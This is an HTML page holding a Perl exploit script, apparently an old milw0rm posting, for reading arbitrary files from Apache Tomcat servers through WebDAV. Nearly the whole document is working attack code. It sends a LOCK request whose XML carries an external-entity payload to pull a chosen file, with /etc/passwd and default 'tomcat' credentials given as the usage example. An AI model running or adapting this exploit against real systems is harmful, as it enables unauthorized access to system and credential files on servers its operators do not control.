<html><head><title>Apache Tomcat (webdav) Remote File Disclosure Exploit</title></head><pre>#!/usr/bin/perl
#******************************************************
# Apache Tomcat Remote File Disclosure Zeroday Xploit
# kcdarookie aka eliteb0y / 2007
#
# thanx to the whole team &amp; andi :)
# +++KEEP PRIV8+++
#
# This Bug may reside in different WebDav implementations,
# Warp your mind!
# +You will need auth for the exploit to work...
#******************************************************

use IO::Socket;
use MIME::Base64; ### FIXME! Maybe support other auths too ?

# SET REMOTE PORT HERE
$remoteport = 8080;

sub usage {
	print &quot;Apache Tomcat Remote File Disclosure Zeroday Xploit\n&quot;;
	print &quot;kcdarookie aka eliteb0y / 2007\n&quot;;
	print &quot;usage: perl TOMCATXPL &lt;remotehost&gt; &lt;webdav file&gt; &lt;file to retrieve&gt; [username] [password]\n&quot;;
	print &quot;example: perl TOMCATXPL www.hostname.com /webdav /etc/passwd tomcat tomcat\n&quot;;exit;
}

if ($#ARGV &lt; 2) {usage();}

$hostname = $ARGV[0];
$webdavfile = $ARGV[1];
$remotefile = $ARGV[2];

$username = $ARGV[3];
$password = $ARGV[4];

my $sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $hostname,
                              PeerPort =&gt; $remoteport,
                              Proto    =&gt; 'tcp');
                              
$|=1;
$BasicAuth = encode_base64(&quot;$username:$password&quot;);

$KRADXmL = 
&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;
.&quot;&lt;!DOCTYPE REMOTE [\n&quot;
.&quot;&lt;!ENTITY RemoteX SYSTEM \&quot;$remotefile\&quot;&gt;\n&quot;
.&quot;]&gt;\n&quot;
.&quot;&lt;D:lockinfo xmlns:D='DAV:'&gt;\n&quot;
.&quot;&lt;D:lockscope&gt;&lt;D:exclusive/&gt;&lt;/D:lockscope&gt;\n&quot;
.&quot;&lt;D:locktype&gt;&lt;D:write/&gt;&lt;/D:locktype&gt;\n&quot;
.&quot;&lt;D:owner&gt;\n&quot;
.&quot;&lt;D:href&gt;\n&quot;
.&quot;&lt;REMOTE&gt;\n&quot;
.&quot;&lt;RemoteX&gt;&amp;RemoteX;&lt;/RemoteX&gt;\n&quot;
.&quot;&lt;/REMOTE&gt;\n&quot;
.&quot;&lt;/D:href&gt;\n&quot;
.&quot;&lt;/D:owner&gt;\n&quot;
.&quot;&lt;/D:lockinfo&gt;\n&quot;;

print &quot;Apache Tomcat Remote File Disclosure Zeroday Xploit\n&quot;;
print &quot;kcdarookie aka eliteb0y / 2007\n&quot;;
print &quot;Launching Remote Exploit...\n&quot;;

$ExploitRequest =
 &quot;LOCK $webdavfile HTTP/1.1\r\n&quot;
.&quot;Host: $hostname\r\n&quot;;

if ($username ne &quot;&quot;) {
$ExploitRequest .= &quot;Authorization: Basic $BasicAuth\r\n&quot;;	
}
$ExploitRequest .= &quot;Content-Type: text/xml\r\nContent-Length: &quot;.length($KRADXmL).&quot;\r\n\r\n&quot; . $KRADXmL;

print $sock $ExploitRequest;

while(&lt;$sock&gt;) {
	print;
}

# milw0rm.com [2007-10-14]</pre></html>